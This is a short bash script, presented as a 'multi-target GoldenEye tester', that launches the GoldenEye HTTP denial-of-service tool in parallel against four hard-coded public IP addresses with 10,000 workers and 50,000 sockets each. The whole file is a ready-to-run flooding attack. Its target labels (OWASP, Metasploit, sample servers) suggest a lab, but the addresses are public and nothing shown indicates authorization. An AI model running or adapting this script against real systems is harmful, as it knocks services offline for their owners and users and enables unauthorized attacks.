#!/bin/bash
# Multi-target GoldenEye tester (cleaned version)

# Target servers
OWASP_SERVER="https://41.203.208.129"
METASPLOIT_SERVER="https://197.248.128.1"
SAMPLE_SERVER="https://197.248.128.2"
SIMPLE_SAMPLE="https://41.203.208.130"

# GoldenEye settings
WORKERS=10000
SOCKETS=50000
METHOD="random"
DEBUG="-d"
NOSSL="-n"

# Test OWASP server
python3 goldeneye.py $OWASP_SERVER -w $WORKERS -s $SOCKETS -m $METHOD $DEBUG $NOSSL &
PID1=$!

sleep 5

# Test Metasploit server
python3 goldeneye.py $METASPLOIT_SERVER -w $WORKERS -s $SOCKETS -m $METHOD $DEBUG $NOSSL &
PID2=$!

sleep 5

# Test Sample server
python3 goldeneye.py $SAMPLE_SERVER -w $WORKERS -s $SOCKETS -m $METHOD $DEBUG $NOSSL &
PID3=$!

sleep 5

# Test Simple Sample server
python3 goldeneye.py $SIMPLE_SAMPLE -w $WORKERS -s $SOCKETS -m $METHOD $DEBUG $NOSSL &
PID4=$!
